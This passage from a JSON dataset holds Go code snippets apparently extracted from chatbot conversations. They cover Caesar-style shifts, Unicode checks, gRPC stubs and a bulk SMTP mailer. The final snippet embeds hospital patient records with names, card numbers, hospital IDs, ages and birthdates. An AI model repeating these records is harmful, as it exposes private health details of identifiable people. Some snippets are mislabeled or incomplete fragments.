    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc ShiftASCII(s string, step int) string {\n\t// Создаем пустую строку для результата\n\tresult := \"\"\n\n\t// Проходим по всей строке s\n\tfor i := 0; i < len(s); i++ {\n\t\t// Получаем ASCII код текущего символа\n\t\tchar := s[i]\n\n\t\t// Напрямую сдвинутый код символа, не учитывает зацикливание на ASCII таблице\n\t\tshifted := int(char) + step\n\n\t\t// Если символ не является печатным ASCII, то оставляем его неизменным\n\t\tif char < 32 || char > 126 {\n\t\t\tresult += string(char)\n\t\t\tcontinue\n\t\t}\n\n\t\t// Положительное зацикливание\n\t\tfor shifted > 126 {\n\t\t\tshifted -= 95 // Разница между макс. и мин. печатными символами ASCII + 1\n\t\t}\n\t\t// Отрицательное зацикливание\n\t\tfor shifted < 32 {\n\t\t\tshifted += 95 // Разница между макс. и мин. печатными символами ASCII + 1\n\t\t}\n\n\t\t// Добавляем сдвинутый символ к результату\n\t\tresult += string(shifted)\n\t}\n\n\t// Возвращаем результат\n\treturn result\n}\n\nfunc main() {\n\t// Пример использования функции\n\tinputStr := \"Hello, World!\"\n\tshiftStep := 3\n\toutputStr := ShiftASCII(inputStr, shiftStep)\n\tfmt.Println(\"Original:\", inputStr)\n\tfmt.Println(\"Shifted: \", outputStr)\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_0.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func ShiftASCII(s string, step int) string {\n    // If the step is 0, there is no need to do any shifting, so the original string is returned.\n    if step == 0 {\n        return s\n    }\n\n    // Create a byte slice `shifted` with the same length as the input string `s`.\n    // This byte slice will store the shifted ASCII values of the original string.\n    shifted := make([]byte, len(s))\n\n    // Iterate over the input string `s`.\n    for i := 0; i < len(s); i++ {\n        // Calculate the new ASCII code by adding `step` to the ASCII value\n        // of the `i`th character of the string `s`.\n        shift := step + int(s[i])\n\n        // Assign the calculated shift value to the `i`th index of the `shifted` byte slice.\n        // It does not check if the 'shift' value exceeds the range of printable ASCII characters.\n        shifted[i] = byte(shift)\n    }\n\n    // Convert the byte slice `shifted` back to a string and return it.\n    // This string theoretically contains characters with their ASCII values shifted by `step`,\n    // but there is no wraparound or bounds check, so it may contain non-printable characters or\n    // exceed the ASCII range.\n    return string(shifted)\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_1.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\n// IsASCII функция проверяет, что строка состоит только из символов ASCII.\nfunc IsASCII(s string) bool {\n\tfor i := 0; i < len(s); i++ {\n\t\tif s[i] > 127 {\n\t\t\t// Если символ имеет значение больше 127,\n\t\t\t// то он не является ASCII символом.\n\t\t\treturn false\n\t\t}\n\t}\n\t// Все символы строки являются ASCII символами.\n\treturn true\n}\n\nfunc main() {\n\t// Пример проверки функции с ASCII и не-ASCII строками.\n\tasciiStr := \"Hello, World!\"\n\tnonAsciiStr := \"Привет, Мир!\"\n\n\tfmt.Printf(\"Is \\\"%s\\\" ASCII? %v\\n\", asciiStr, IsASCII(asciiStr))\n\tfmt.Printf(\"Is \\\"%s\\\" ASCII? %v\\n\", nonAsciiStr, IsASCII(nonAsciiStr))\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_2.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"unicode\"\n)\n\n// ContainsLatin checks if the input string contains at least one Latin character.\nfunc ContainsLatin(s string) bool {\n\tfor _, r := range s {\n\t\tif unicode.Is(unicode.Latin, r) {\n\t\t\treturn true // A Latin character was found.\n\t\t}\n\t}\n\treturn false // No Latin characters found.\n}\n\nfunc main() {\n\ttestStrings := []string{\n\t\t\"Hello, World!\",   // Contains Latin characters.\n\t\t\"こんにちは\",       // Contains Japanese characters.\n\t\t\"12345!\",          // Contains digits and punctuation.\n\t\t\"Привет, Мир!\",    // Contains Cyrillic characters.\n\t\t\"Español con ñ\",   // Contains Latin characters with an accented character.\n\t\t\"中国\",             // Contains Chinese characters.\n\t\t\"😀 Emoji 😀\",     // Contains Emoji characters.\n\t}\n\n\tfor _, str := range testStrings {\n\t\tfmt.Printf(\"Does \\\"%s\\\" contain Latin characters? %v\\n\", str, ContainsLatin(str))\n\t}\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_3.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"unicode\"\n)\n\n// LatinLetters возвращает новую строку, содержащую только латинские символы из строки s.\nfunc LatinLetters(s string) string {\n\tvar result []rune // Используем слайс рун для сохранения латинских символов\n\tfor _, r := range s {\n\t\tif unicode.Is(unicode.Latin, r) {\n\t\t\tresult = append(result, r)\n\t\t}\n\t}\n\treturn string(result) // Конвертирование слайса рун обратно в строку\n}\n\nfunc main() {\n\tinput := \"привет world!\"\n\tfmt.Println(LatinLetters(input)) // Вывод: \"world\"\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_4.go"
  },
  {
    "conversation_hash": "8fa8a2e0305cd368c7681a2a55032787",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nconst (\n    userEnabled = 1 << iota // userEnabled == 1 (because iota == 0)\n    userVerified            // userVerified == 2 (because iota == 1)\n    userAdmin               // userAdmin == 4 (because iota == 2)\n)\n\nfunc main() {\n    fmt.Println(\"userEnabled:\", userEnabled)\n    fmt.Println(\"userVerified:\", userVerified)\n    fmt.Println(\"userAdmin:\", userAdmin)\n}",
    "filename": "8fa8a2e0305cd368c7681a2a55032787_5.go"
  },
  {
    "conversation_hash": "09837e7b70e126ce69ca4b3c254b41c2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type Rectangle struct {\n    Width, Height float64\n}\n\nfunc (r Rectangle) Area() float64 {\n    return r.Width * r.Height\n}\n\nfunc (r Rectangle) Perimeter() float64 {\n    return 2 * (r.Width + r.Height)\n}\n\ntype Circle struct {\n    Radius float64\n}\n\nfunc (c Circle) Area() float64 {\n    return math.Pi * c.Radius * c.Radius\n}\n\nfunc (c Circle) Perimeter() float64 {\n    return 2 * math.Pi * c.Radius\n}",
    "filename": "09837e7b70e126ce69ca4b3c254b41c2_1.go"
  },
  {
    "conversation_hash": "09837e7b70e126ce69ca4b3c254b41c2",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func PrintShapeInfo(s Shape) {\n    fmt.Printf(\"Area: %v\\n\", s.Area())\n    fmt.Printf(\"Perimeter: %v\\n\", s.Perimeter())\n}\n\nfunc main() {\n    r := Rectangle{Width: 3, Height: 4}\n    c := Circle{Radius: 5}\n\n    PrintShapeInfo(r)\n    PrintShapeInfo(c)\n}",
    "filename": "09837e7b70e126ce69ca4b3c254b41c2_2.go"
  },
  {
    "conversation_hash": "7016c70d9cd4a4a311da129a20aa1583",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "struct VestingCategory {\n    string category; // Category name\n    uint256 maxAllocation; // Maximum allocation for this category\n    ...\n}\n\nstruct UserVesting {\n    uint256 amount; // Total vesting amount\n    ...\n}\n\n/// Define complex data types, critical for managing vesting categories and user-specific vesting data",
    "filename": "7016c70d9cd4a4a311da129a20aa1583_3.go"
  },
  {
    "conversation_hash": "532f296eadc065630de4d1ef69330f9b",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "file"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/smtp\"\n\t\"os\"\n\t\"strings\"\n)\n\n// SMTPServer details for the SMTP server\ntype SMTPServer struct {\n\tHost     string\n\tPort     string\n\tUsername string\n\tPassword string\n}\n\n// ServerName returns the server name to dial\nfunc (server *SMTPServer) ServerName() string {\n\treturn server.Host + \":\" + server.Port\n}\n\n// Auth returns the authentication details\nfunc (server *SMTPServer) Auth() smtp.Auth {\n\treturn smtp.PlainAuth(\"\", server.Username, server.Password, server.Host)\n}\n\nfunc sendEmail(to []string, server *SMTPServer) error {\n\t// Define email headers and body\n\tfrom := server.Username\n\tsubject := \"Subject: Your Email Subject Here\\n\"\n\tmime := \"MIME-version: 1.0;\\nContent-Type: text/plain; charset=\\\"UTF-8\\\";\\n\\n\"\n\tbody := \"Hello,\\n\\nThis is a test email sent by a Go program.\"\n\n\tmessage := []byte(\"From: \" + from + \"\\n\" + \"To: \" + strings.Join(to, \",\") + \"\\n\" + subject + mime + \"\\n\" + body)\n\n\t// Get authentication and dial the server\n\tauth := server.Auth()\n\terr := smtp.SendMail(server.ServerName(), auth, from, to, message)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc readEmailsFromFile(filePath string) ([]string, error) {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer file.Close()\n\n\tvar emails []string\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\temails = append(emails, scanner.Text())\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn emails, nil\n}\n\nfunc main() {\n\t// Configure the SMTP server details\n\tsmtpServer := SMTPServer{Host: \"smtp.example.com\", Port: \"587\", Username: \"your_username\", Password: \"your_password\"}\n\n\t// Read the email addresses from file\n\temails, err := readEmailsFromFile(\"emails.txt\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Could not read emails from file: %s\", err)\n\t}\n\n\t// Send email to each address\n\tfor _, email := range emails {\n\t\tif err := sendEmail([]string{email}, &smtpServer); err != nil {\n\t\t\tlog.Printf(\"Failed to send email to %s: %s\", email, err)\n\t\t} else {\n\t\t\tfmt.Printf(\"Email successfully sent to %s\\n\", email)\n\t\t}\n\t}\n}",
    "filename": "532f296eadc065630de4d1ef69330f9b_0.go"
  },
  {
    "conversation_hash": "0e01b26470506485d68c108eb86bb7fc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc shiftRune(r rune, step int) rune {\n\tconst (\n\t\tuppercaseA = 'A'\n\t\tuppercaseZ = 'Z'\n\t\tlowercaseA = 'a'\n\t\tlowercaseZ = 'z'\n\t\talphabetSize = 26\n\t)\n\n\t// Shift only letters in the alphabet\n\tif (r >= uppercaseA && r <= uppercaseZ) || (r >= lowercaseA && r <= lowercaseZ) {\n\t\tshifted := r + rune(step)\n\t\t// Handle cases for uppercase letters\n\t\tif r >= uppercaseA && r <= uppercaseZ {\n\t\t\tif shifted > uppercaseZ {\n\t\t\t\tshifted -= alphabetSize\n\t\t\t} else if shifted < uppercaseA {\n\t\t\t\tshifted += alphabetSize\n\t\t\t}\n\t\t}\n\t\t// Handle cases for lowercase letters\n\t\tif r >= lowercaseA && r <= lowercaseZ {\n\t\t\tif shifted > lowercaseZ {\n\t\t\t\tshifted -= alphabetSize\n\t\t\t} else if shifted < lowercaseA {\n\t\t\t\tshifted += alphabetSize\n\t\t\t}\n\t\t}\n\t\treturn shifted\n\t}\n\treturn r // Non-alphabetic runes remain unchanged\n}\n\nfunc shiftString(s string, step int) string {\n\tshiftedRunes := make([]rune, len(s))\n\tfor i, r := range s {\n\t\tshiftedRunes[i] = shiftRune(r, step)\n\t}\n\treturn string(shiftedRunes)\n}\n\nfunc main() {\n\toriginal := \"Hello, World!\"\n\tstep := 3\n\tshifted := shiftString(original, step)\n\tfmt.Println(\"Original string:\", original)\n\tfmt.Println(\"Shifted string:\", shifted)\n}",
    "filename": "0e01b26470506485d68c108eb86bb7fc_0.go"
  },
  {
    "conversation_hash": "0e01b26470506485d68c108eb86bb7fc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc shiftByte(b byte, step int) byte {\n\tconst (\n\t\tuppercaseA = 'A'\n\t\tuppercaseZ = 'Z'\n\t\tlowercaseA = 'a'\n\t\tlowercaseZ = 'z'\n\t\talphabetSize = 26\n\t)\n\n\t// Normalize the step to stay within the 0-25 range\n\tstep = ((step % alphabetSize) + alphabetSize) % alphabetSize\n\n\t// Shift uppercase letters\n\tif b >= uppercaseA && b <= uppercaseZ {\n\t\treturn ((b-uppercaseA+byte(step))%alphabetSize + uppercaseA)\n\t}\n\t// Shift lowercase letters\n\tif b >= lowercaseA && b <= lowercaseZ {\n\t\treturn ((b-lowercaseA+byte(step))%alphabetSize + lowercaseA)\n\t}\n\t// Non-alphabetic bytes remain unchanged\n\treturn b\n}\n\nfunc shiftString(s string, step int) string {\n\tshiftedBytes := make([]byte, len(s))\n\tfor i := 0; i < len(s); i++ {\n\t\tshiftedBytes[i] = shiftByte(s[i], step)\n\t}\n\treturn string(shiftedBytes)\n}\n\nfunc main() {\n\toriginal := \"Hello, World!\"\n\tstep := 3\n\tshifted := shiftString(original, step)\n\tfmt.Println(\"Original string:\", original)\n\tfmt.Println(\"Shifted string:\", shifted)\n}",
    "filename": "0e01b26470506485d68c108eb86bb7fc_1.go"
  },
  {
    "conversation_hash": "0e01b26470506485d68c108eb86bb7fc",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc shiftChar(c byte, step int) byte {\n\tconst (\n\t\tuppercaseA = 'A'\n\t\tuppercaseZ = 'Z'\n\t\tlowercaseA = 'a'\n\t\tlowercaseZ = 'z'\n\t\talphabetSize = 26\n\t)\n\n\t// Keep step in the range of 0 to 25\n\tstep %= alphabetSize\n\n\t// Calculate new character position after the shift\n\tif c >= uppercaseA && c <= uppercaseZ { // Uppercase letter\n\t\treturn (c-uppercaseA+byte(step))%alphabetSize + uppercaseA\n\t} else if c >= lowercaseA && c <= lowercaseZ { // Lowercase letter\n\t\treturn (c-lowercaseA+byte(step))%alphabetSize + lowercaseA\n\t}\n\n\treturn c // Non-alphabetic characters remain unchanged\n}\n\nfunc shiftString(s string, step int) string {\n\tshifted := \"\"\n\tfor i := 0; i < len(s); i++ {\n\t\tshifted += string(shiftChar(s[i], step))\n\t}\n\treturn shifted\n}\n\nfunc main() {\n\toriginal := \"Hello, World!\"\n\tstep := 3 // The example step value\n\tshifted := shiftString(original, step)\n\tfmt.Println(\"Original string:\", original)\n\tfmt.Println(\"Shifted string:\", shifted)\n}",
    "filename": "0e01b26470506485d68c108eb86bb7fc_2.go"
  },
  {
    "conversation_hash": "c2061cca3f16666d29ed0fea390cb464",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// goals.go\npackage main\n\nimport (\n\t\"github.com/gofiber/fiber/v2\"\n\t// \"project/models\" // 假设你的模型文件在一个称为project的模块下\n\t// \"project/utils\"  // 假设你的辅助功能文件在一个称为project的模块下\n)\n\n// CreateTeamGoal 创建团队目标\nfunc CreateTeamGoal(c *fiber.Ctx) error {\n\t// 解析请求的JSON数据\n\tteamGoal := &models.TeamGoal{}\n\tif err := c.BodyParser(teamGoal); err != nil {\n\t\treturn c.Status(fiber.StatusBadRequest).JSON(fiber.Map{\"error\": \"Cannot parse JSON\"})\n\t}\n\n\t// 输入验证（省略具体实现）\n\t// ...\n\n\t// 逻辑处理（省略数据层代码）\n\t// 假设逻辑处理成功\n\n\t// 返回响应\n\treturn c.Status(fiber.StatusCreated).JSON(teamGoal)\n}",
    "filename": "c2061cca3f16666d29ed0fea390cb464_2.go"
  },
  {
    "conversation_hash": "c2061cca3f16666d29ed0fea390cb464",
    "code_index": 12,
    "language": "Go",
    "libraries": [
      "path."
    ],
    "code": "// server.go\npackage main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"log\"\n    \"net\"\n\n    \"google.golang.org/grpc\"\n    pb \"path/to/your/protos/okr\" // Update this import path.\n)\n\ntype server struct {\n    pb.UnimplementedOKRServiceServer\n}\n\nfunc (s *server) CreateTeamGoal(ctx context.Context, req *pb.CreateTeamGoalRequest) (*pb.TeamGoalResponse, error) {\n    // 这里你可以添加创建团队目标的逻辑\n    // 示例中简单返回请求的信息\n    return &pb.TeamGoalResponse{\n        GoalId:    1, // 假设的ID，实际中需要从数据库获取\n        TeamId:    req.GetTeamId(),\n        Title:     req.GetTitle(),\n        Type:      req.GetType(),\n        DueDate:   req.GetDueDate(),\n    }, nil\n}\n\n// 其他 gRPC 接口实现…\n\nfunc main() {\n    lis, err := net.Listen(\"tcp\", \":50051\")\n    if err != nil {\n        log.Fatalf(\"failed to listen: %v\", err)\n    }\n    s := grpc.NewServer()\n    pb.RegisterOKRServiceServer(s, &server{})\n    log.Printf(\"Server listening at %v\", lis.Addr())\n    if err := s.Serve(lis); err != nil {\n        log.Fatalf(\"failed to serve: %v\", err)\n    }\n}",
    "filename": "c2061cca3f16666d29ed0fea390cb464_12.go"
  },
  {
    "conversation_hash": "c2061cca3f16666d29ed0fea390cb464",
    "code_index": 14,
    "language": "Go",
    "libraries": [
      "path."
    ],
    "code": "// client.go\npackage main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    \"google.golang.org/grpc\"\n    pb \"path/to/your/protos/okr\" // Update this import path.\n    \"google.golang.org/protobuf/types/known/timestamppb\"\n)\n\nfunc main() {\n    // 设置服务端地址\n    address := \"localhost:50051\"\n    conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock())\n    if err != nil {\n        log.Fatalf(\"did not connect: %v\", err)\n    }\n    defer conn.Close()\n    c := pb.NewOKRServiceClient(conn)\n\n    // 设置超时\n    ctx, cancel := context.WithTimeout(context.Background(), time.Second)\n    defer cancel()\n\n    // 创建新的团队目标请求\n    req := &pb.CreateTeamGoalRequest{\n        TeamId:    1,\n        Title:     \"Increase Sales\",\n        Type:      pb.GoalType_LONG_TERM,\n        DueDate:   timestamppb.Now(),\n    }\n    res, err := c.CreateTeamGoal(ctx, req)\n    if err != nil {\n        log.Fatalf(\"could not create team goal: %v\", err)\n    }\n    log.Printf(\"Team Goal Created: %v\", res)\n}",
    "filename": "c2061cca3f16666d29ed0fea390cb464_14.go"
  },
  {
    "conversation_hash": "8e6e99a231bbea739992075e066bd9f9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"log\"\n    \"net\"\n\n    // 假设proto文件和生成的代码在同一包下\n    pb \"path/to/your/protobuf/package\" // 替换为实际生成的package路径\n    \"google.golang.org/grpc\"\n)\n\n// server is used to implement v1.FooServer.\ntype server struct {\n    pb.UnimplementedFooServer\n}\n\n// 实现Ping服务\nfunc (s *server) Ping(ctx context.Context, in *empty.Empty) (*empty.Empty, error) {\n    return &empty.Empty{}, nil\n}\n\n// 实现Update服务\nfunc (s *server) Update(ctx context.Context, in *pb.UpdateReq) (*empty.Empty, error) {\n    // 你的逻辑代码\n    return &empty.Empty{}, nil\n}\n\n// 实现List服务\nfunc (s *server) List(ctx context.Context, in *empty.Empty) (*pb.ListResponse, error) {\n    // 你的逻辑代码\n    return &pb.ListResponse{}, nil\n}\n\n// 实现Login服务\nfunc (s *server) Login(ctx context.Context, in *pb.LoginReq) (*pb.LoginResp, error) {\n    // 你的逻辑代码\n    return &pb.LoginResp{}, nil\n}\n\n// 实现PathExample服务\nfunc (s *server) PathExample(ctx context.Context, in *pb.PathExampleReq) (*pb.PathExampleResp, error) {\n    // 你的逻辑代码\n    return &pb.PathExampleResp{}, nil\n}\n\nfunc main() {\n    lis, err := net.Listen(\"tcp\", \":50051\")\n    if err != nil {\n        log.Fatalf(\"failed to listen: %v\", err)\n    }\n    s := grpc.NewServer()\n    pb.RegisterFooServer(s, &server{})\n    if err := s.Serve(lis); err != nil {\n        log.Fatalf(\"failed to serve: %v\", err)\n    }\n}",
    "filename": "8e6e99a231bbea739992075e066bd9f9_2.go"
  },
  {
    "conversation_hash": "8e6e99a231bbea739992075e066bd9f9",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"log\"\n    \"time\"\n\n    // 假设proto文件和生成的代码在同一包下\n    pb \"path/to/your/protobuf/package\" // 替换为实际生成的package路径\n    \"google.golang.org/grpc\"\n)\n\nfunc main() {\n    conn, err := grpc.Dial(\":50051\", grpc.WithInsecure(), grpc.WithBlock())\n    if err != nil {\n        log.Fatalf(\"did not connect: %v\", err)\n    }\n    defer conn.Close()\n    c := pb.NewFooClient(conn)\n\n    ctx, cancel := context.WithTimeout(context.Background(), time.Second)\n    defer cancel()\n\n    // Ping 例子\n    _, err = c.Ping(ctx, &empty.Empty{})\n    if err != nil {\n        log.Fatalf(\"could not ping: %v\", err)\n    }\n\n    // Update 例子\n    _, err = c.Update(ctx, &pb.UpdateReq{Arg1: \"example\"})\n    if err != nil {\n        log.Fatalf(\"could not update: %v\", err)\n    }\n\n    // List 例子\n    listResponse, err := c.List(ctx, &empty.Empty{})\n    if err != nil {\n        log.Fatalf(\"could not list: %v\", err)\n    }\n\n    // Login 例子\n    loginResp, err := c.Login(ctx, &pb.LoginReq{Username: \"user\", Password: \"pass\"})\n    if err != nil {\n        log.Fatalf(\"could not login: %v\", err)\n    }\n\n    // PathExample 例子\n    pathExampleResp, err := c.PathExample(ctx, &pb.PathExampleReq{ID: \"123\"})\n    if err != nil {\n        log.Fatalf(\"could not call PathExample: %v\", err)\n    }\n}",
    "filename": "8e6e99a231bbea739992075e066bd9f9_3.go"
  },
  {
    "conversation_hash": "cffdf3f1211adb8125b9138b89e43c90",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"net\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"path/to/your/protobuf/package\" // 替换为你的protobuf包的路径\n)\n\n// server is used to implement the Foo service.\ntype server struct {\n\tpb.UnimplementedFooServer\n}\n\nfunc (s *server) Ping(ctx context.Context, in *pb.Empty) (*pb.Empty, error) {\n\treturn &pb.Empty{}, nil\n}\n\nfunc (s *server) Update(ctx context.Context, in *pb.UpdateReq) (*pb.Empty, error) {\n\t// Implement your update logic here\n\treturn &pb.Empty{}, nil\n}\n\nfunc (s *server) List(ctx context.Context, in *pb.Empty) (*pb.ListItems, error) {\n\t// Implement your list logic here, returning a list of items\n\treturn &pb.ListItems{Items: []*pb.ListItem{\n\t\t{Value1: \"Item 1\"},\n\t}}, nil\n}\n\nfunc (s *server) Login(ctx context.Context, in *pb.LoginReq) (*pb.LoginResp, error) {\n\t// Implement your login logic here, returning the user's name if successful\n\treturn &pb.LoginResp{Name: \"User Name\"}, nil\n}\n\nfunc (s *server) FormExample(ctx context.Context, in *pb.FormExampleReq) (*pb.Empty, error) {\n\t// Implement your form logic here\n\treturn &pb.Empty{}, nil\n}\n\nfunc (s *server) PathExample(ctx context.Context, in *pb.PathExampleReq) (*pb.PathExampleResp, error) {\n\t// Implement your path example logic here, returning the associated name for the id\n\treturn &pb.PathExampleResp{Name: \"Associated Name\"}, nil\n}\n\nfunc main() {\n\tlis, err := net.Listen(\"tcp\", \":50051\")\n\tif err != nil {\n\t\tlog.Fatalf(\"failed to listen: %v\", err)\n\t}\n\ts := grpc.NewServer()\n\tpb.RegisterFooServer(s, &server{})\n\tif err := s.Serve(lis); err != nil {\n\t\tlog.Fatalf(\"failed to serve: %v\", err)\n\t}\n}",
    "filename": "cffdf3f1211adb8125b9138b89e43c90_2.go"
  },
  {
    "conversation_hash": "cffdf3f1211adb8125b9138b89e43c90",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\t\"time\"\n\n\t\"google.golang.org/grpc\"\n\tpb \"path/to/your/protobuf/package\" // 替换为你的protobuf包的路径\n)\n\nfunc main() {\n\tconn, err := grpc.Dial(\"localhost:50051\", grpc.WithInsecure(), grpc.WithBlock())\n\tif err != nil {\n\t\tlog.Fatalf(\"did not connect: %v\", err)\n\t}\n\tdefer conn.Close()\n\tc := pb.NewFooClient(conn)\n\n\tctx, cancel := context.WithTimeout(context.Background(), time.Second)\n\tdefer cancel()\n\n\t// Ping\n\t_, err = c.Ping(ctx, &pb.Empty{})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not ping: %v\", err)\n\t}\n\tlog.Println(\"Ping successful\")\n\n\t// Update\n\t_, err = c.Update(ctx, &pb.UpdateReq{Arg1: \"New Value\"})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not update: %v\", err)\n\t}\n\tlog.Println(\"Update successful\")\n\n\t// List\n\tlist, err := c.List(ctx, &pb.Empty{})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not list items: %v\", err)\n\t}\n\tfor _, item := range list.Items {\n\t\tlog.Printf(\"List item: %s\\n\", item.Value1)\n\t}\n\n\t// Login\n\tloginResp, err := c.Login(ctx, &pb.LoginReq{Username: \"user\", Password: \"password\"})\n\tif err != nil {\n\t\tlog.Fatalf(\"could not login: %v\", err)\n\t}\n\tlog.Printf(\"Login successful, Name: %s\\n\", loginResp.Name)\n}",
    "filename": "cffdf3f1211adb8125b9138b89e43c90_3.go"
  },
  {
    "conversation_hash": "88c89cfb1f2cfac08db3407018d5c4f3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype HospitalInfo struct {\n\tBed            string `json:\"BED\"`\n\tCardID         string `json:\"CARDID\"`\n\tHospitalNumber string `json:\"HOSPITALNUMBER\"`\n\tName           string `json:\"NAME\"`\n\tGender         string `json:\"GENDER\"`\n\tAge            string `json:\"AGE\"`\n\tBirthDate      string `json:\"BIRTHDATE\"`\n\tRecordDate     string `json:\"RECORDDATE\"`\n}\n\nfunc main() {\n\tjsonStr := `[{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3128\"},{\"Hosp\":\"CARDID\",\"Value\":\"001002050286\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00165704\"},{\"Hosp\":\"NAME\",\"Value\":\"缪金生\"},{\"Hosp\":\"GENDER\",\"Value\":\"男性\"},{\"Hosp\":\"AGE\",\"Value\":\"87\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1936-03-27 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-12 16:00:00.0\"}]},{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3131\"},{\"Hosp\":\"CARDID\",\"Value\":\"001000517805\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00348869\"},{\"Hosp\":\"NAME\",\"Value\":\"俞叙元\"},{\"Hosp\":\"GENDER\",\"Value\":\"男性\"},{\"Hosp\":\"AGE\",\"Value\":\"66\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1957-09-06 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-08 16:00:00.0\"}]},{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3123\"},{\"Hosp\":\"CARDID\",\"Value\":\"001000373013\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00204488\"},{\"Hosp\":\"NAME\",\"Value\":\"李登龙\"},{\"Hosp\":\"GENDER\",\"Value\":\"男性\"},{\"Hosp\":\"AGE\",\"Value\":\"70\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1953-11-28 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-12 16:00:00.0\"}]},{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3134\"},{\"Hosp\":\"CARDID\",\"Value\":\"001000728516\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00159656\"},{\"Hosp\":\"NAME\",\"Value\":\"陈淑娴\"},{\"Hosp\":\"GENDER\",\"Value\":\"女性\"},{\"Hosp\":\"AGE\",\"Value\":\"89\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1934-11-13 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-12 16:00:00.0\"}]},{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3126\"},{\"Hosp\":\"CARDID\",\"Value\":\"001004796170\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00289217\"},{\"Hosp\":\"NAME\",\"Value\":\"龚希信\"},{\"Hosp\":\"GENDER\",\"Value\":\"男性\"},{\"Hosp\":\"AGE\",\"Value\":\"76\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1947-12-25 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-12 16:00:00.0\"}]},{\"Cols\":[{\"Hosp\":\"BED\",\"Value\":\"3135\"},{\"Hosp\":\"CARDID\",\"Value\":\"001000070823\"},{\"Hosp\":\"HOSPITALNUMBER\",\"Value\":\"A00110831\"},{\"Hosp\":\"NAME\",\"Value\":\"钱宁华\"},{\"Hosp\":\"GENDER\",\"Value\":\"女性\"},{\"Hosp\":\"AGE\",\"Value\":\"95\"},{\"Hosp\":\"BIRTHDATE\",\"Value\":\"1928-09-27 00:00:00.0\"},{\"Hosp\":\"RECORDDATE\",\"Value\":\"2024-01-12 16:00:00.0\"}]}]`\n\n\tvar hospitalList []HospitalInfo\n\n\terr := json.Unmarshal([]byte(jsonStr), &hospitalList)\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfor _, hospital := range hospitalList 